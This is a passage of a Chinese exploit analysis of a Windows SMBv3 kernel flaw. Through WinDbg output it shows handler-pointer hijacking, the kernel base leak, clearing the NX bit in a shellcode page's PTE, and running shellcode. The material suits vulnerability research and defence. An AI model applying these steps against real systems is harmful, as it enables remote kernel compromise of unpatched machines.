3、利用任意地址写将srvnet!imp_RtlCopyUnicodeString指针-8的地址写入SRVNET_RECV结构偏移0x118处的HandlerFunctions，这样系统会认为nt!RtlCopyUnicodeString指针是srv2!Srv2ReceiveHandler函数指针。
    kd> dd 0xffffa50834ba42d8-58+118    //HandlerFunctions
    ffffa508`34ba4398  3479cd18 ffffa508 2f4a6dc0 ffffa508
    ffffa508`34ba43a8  34ae4170 ffffa508 34f2a040 ffffa508
    kd> u poi(ffffa5083479cd18+8)    //覆盖前第二项为srv2!Srv2ReceiveHandler函数指针
    srv2!Srv2ReceiveHandler:
    fffff802`51cdc3b0 44894c2420      mov     dword ptr [rsp+20h],r9d
    fffff802`51cdc3b5 53              push    rbx
    fffff802`51cdc3b6 55              push    rbp
    fffff802`51cdc3b7 4154            push    r12
    fffff802`51cdc3b9 4155            push    r13
    fffff802`51cdc3bb 4157            push    r15
    fffff802`51cdc3bd 4883ec70        sub     rsp,70h
    fffff802`51cdc3c1 488b8424d8000000 mov     rax,qword ptr [rsp+0D8h]
    kd> g
    copy: ffffa508`34ba4398  ffffa508`3479cd18 ffffa508`2f4a6dc0
    srv2!Srv2DecompressData+0x108:
    fffff802`51ce7f68 e85376ffff      call    srv2!memcpy (fffff802`51cdf5c0)
    kd> p
    srv2!Srv2DecompressData+0x10d:
    fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
    kd> dq ffffa508`34ba4398
    ffffa508`34ba4398  fffff802`57d42280 ffffa508`2f4a6dc0
    ffffa508`34ba43a8  ffffa508`34ae4170 ffffa508`34f2a040
    kd> u poi(fffff802`57d42280+8)    //覆盖前第二项为nt!RtlCopyUnicodeString函数指针
    nt!RtlCopyUnicodeString:
    fffff802`52d1c170 4057            push    rdi
    fffff802`52d1c172 4883ec20        sub     rsp,20h
    fffff802`52d1c176 488bc2          mov     rax,rdx
    fffff802`52d1c179 488bf9          mov     rdi,rcx
    fffff802`52d1c17c 4885d2          test    rdx,rdx
    fffff802`52d1c17f 745b            je      nt!RtlCopyUnicodeString+0x6c (fffff802`52d1c1dc)
    fffff802`52d1c181 440fb700        movzx   r8d,word ptr [rax]
    fffff802`52d1c185 0fb74102        movzx   eax,word ptr [rcx+2]
4、利用任意地址写分别将两个参数写入SRVNET_RECT结构的偏移0x128和0x130处，为HandlerFunctions中函数的前两个参数。
    kd> dd 0xffffa50834ba42d8-58+118
    ffffa508`34ba4398  57d42280 fffff802 2f4a6dc0 ffffa508
    ffffa508`34ba43a8  36241650 ffffa508 36241660 ffffa508
5、向原始连接发送请求，等待srv2!Srv2ReceiveHandler函数（nt!RtlCopyUnicodeString函数）被调用，函数执行后，nt!IoSizeofWorkItem函数的低6个字节成功被复制到目标地址。
    kd> dq ffffa508`36241670 
    ffffa508`36241670  0000f802`52c7f7a0 00000000`00000000
    ffffa508`36241680  00000000`00000000 00000000`00000000
    ffffa508`36241690  00000000`00000000 00000000`00000000
    kd> u fffff802`52c7f7a0
    nt!IoSizeofWorkItem:
    fffff802`52c7f7a0 b858000000      mov     eax,58h
    fffff802`52c7f7a5 c3              ret
6、然后利用之前的方式将这6个字节依次泄露出来，加上0xffff000000000000，减去IoSizeofWorkItem函数在模块中的偏移得到ntoskrnl基址。
### Shellcode复制&&执行
1、获取PTE基址
利用任意地址读读取nt!MiGetPteAddress函数偏移0x13处的地址，低6位即可。然后加上0xffff000000000000得到PTE基址为0xFFFFF10000000000（0xfffff80252d03d39处第二个操作数）。
    kd> u nt!MiGetPteAddress
    nt!MiGetPteAddress:
    fffff802`52d03d28 48c1e909        shr     rcx,9
    fffff802`52d03d2c 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
    fffff802`52d03d36 4823c8          and     rcx,rax
    fffff802`52d03d39 48b80000000000f1ffff mov rax,0FFFFF10000000000h
    fffff802`52d03d43 4803c1          add     rax,rcx
    fffff802`52d03d46 c3              ret
    d> db nt!MiGetPteAddress + 13 l8
    fffff802`52d03d3b  00 00 00 00 00 f1 ff ff                          ........
2、利用任意地址写将Shellcode复制到0xFFFFF78000000800处，在后续章节会对Shellcode进行进一步分析。
    kd> u 0xFFFFF78000000800
    fffff780`00000800 55              push    rbp
    fffff780`00000801 e807000000      call    fffff780`0000080d
    fffff780`00000806 e819000000      call    fffff780`00000824
    fffff780`0000080b 5d              pop     rbp
    fffff780`0000080c c3              ret
    fffff780`0000080d 488d2d00100000  lea     rbp,[fffff780`00001814]
    fffff780`00000814 48c1ed0c        shr     rbp,0Ch
    fffff780`00000818 48c1e50c        shl     rbp,0Ch
3、计算Shellcode的PTE，依然采用nt!MiGetPteAddress函数中的计算公式。((0xFFFFF78000000800 >> 9 ) &
0x7FFFFFFFF8) + 0xFFFFF10000000000 = 0xFFFFF17BC0000000。然后取出Shellcode
PTE偏移7处的字节并和0x7F相与之后放回原处，去除NX标志位。
    kd> db fffff17b`c0000000    //去NX标志前
    fffff17b`c0000000  63 39 fb 00 00 00 00 80-00 00 00 00 00 00 00 00  c9..............
    fffff17b`c0000010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    kd> dt _MMPTE_HARDWARE fffff17b`c0000000
    nt!_MMPTE_HARDWARE
       +0x000 Valid            : 0y1
       +0x000 Dirty1           : 0y1
       +0x000 Owner            : 0y0
       +0x000 WriteThrough     : 0y0
       +0x000 CacheDisable     : 0y0
       +0x000 Accessed         : 0y1
       +0x000 Dirty            : 0y1
       +0x000 LargePage        : 0y0
       +0x000 Global           : 0y1
       +0x000 CopyOnWrite      : 0y0
       +0x000 Unused           : 0y0
       +0x000 Write            : 0y1
       +0x000 PageFrameNumber  : 0y000000000000000000000000111110110011 (0xfb3)
       +0x000 ReservedForHardware : 0y0000
       +0x000 ReservedForSoftware : 0y0000
       +0x000 WsleAge          : 0y0000
       +0x000 WsleProtection   : 0y000
       +0x000 NoExecute        : 0y1
    kd> db fffff17b`c0000000    //去NX标志后
    fffff17b`c0000000  63 39 fb 00 00 00 00 00-00 00 00 00 00 00 00 00  c9..............
    fffff17b`c0000010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    kd> dt _MMPTE_HARDWARE fffff17b`c0000000
    nt!_MMPTE_HARDWARE
       +0x000 Valid            : 0y1
       +0x000 Dirty1           : 0y1
       +0x000 Owner            : 0y0
       +0x000 WriteThrough     : 0y0
       +0x000 CacheDisable     : 0y0
       +0x000 Accessed         : 0y1
       +0x000 Dirty            : 0y1
       +0x000 LargePage        : 0y0
       +0x000 Global           : 0y1
       +0x000 CopyOnWrite      : 0y0
       +0x000 Unused           : 0y0
       +0x000 Write            : 0y1
       +0x000 PageFrameNumber  : 0y000000000000000000000000111110110011 (0xfb3)
       +0x000 ReservedForHardware : 0y0000
       +0x000 ReservedForSoftware : 0y0000
       +0x000 WsleAge          : 0y0000
       +0x000 WsleProtection   : 0y000
       +0x000 NoExecute        : 0y0
4、利用任意地址写将Shellcode地址（0xFFFFF78000000800）放入可控地址，然后采用已知函数调用的方法用指向Shellcode指针的可控地址减8的值覆写HandlerFunctions。使得HandlerFunctions中的srv2!Srv2ReceiveHandler函数指针被覆盖为Shellcode地址。然后向该连接发包，等待Shellcode被调用。另外，由于ntoskrnl基址已经被泄露出来，可以将其作为参数传给Shellcode，在Shellcode中就不需要获取ntoskrnl基址了。
    kd> dq ffffa508`34ba42d8-58+118 l1
    ffffa508`34ba4398  ffffa508`36241648
    kd> u poi(ffffa508`36241648+8)
    fffff780`00000800 55              push    rbp
    fffff780`00000801 e807000000      call    fffff780`0000080d
    fffff780`00000806 e819000000      call    fffff780`00000824
    fffff780`0000080b 5d              pop     rbp
    fffff780`0000080c c3              ret
    fffff780`0000080d 488d2d00100000  lea     rbp,[fffff780`00001814]
    fffff780`00000814 48c1ed0c        shr     rbp,0Ch
    fffff780`00000818 48c1e50c        shl     rbp,0Ch
    kd> dq ffffa508`34ba42d8-58+128 l1
    ffffa508`34ba43a8  fffff802`52c12000
    kd> lmm nt
    Browse full module list
    start             end                 module name
    fffff802`52c12000 fffff802`536c9000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\5A8A70EAE29939EFA17C9FC879FA0D901\ntkrnlmp.pdb
    kd> g
    Breakpoint 0 hit
    fffff780`00000800 55              push    rbp
    kd> r rcx    //ntoskrnl基址
    rcx=fffff80252c12000
* * *
# Shellcode分析
本分析参考以下链接：
### 寻找ntoskrnl.exe基址
获取内核模块基址在漏洞利用中是很关键的事情，在后面会用到它的很多导出函数。这里列出常见的一种获取ntoskrnl.exe基址的思路：
通过KPCR找到IdtBase，然后根据IdtBase寻找中断0的ISR入口点，该入口点属于ntoskrnl.exe模块，所以可以在找到该地址后向前搜索找到ntoskrnl.exe模块基址。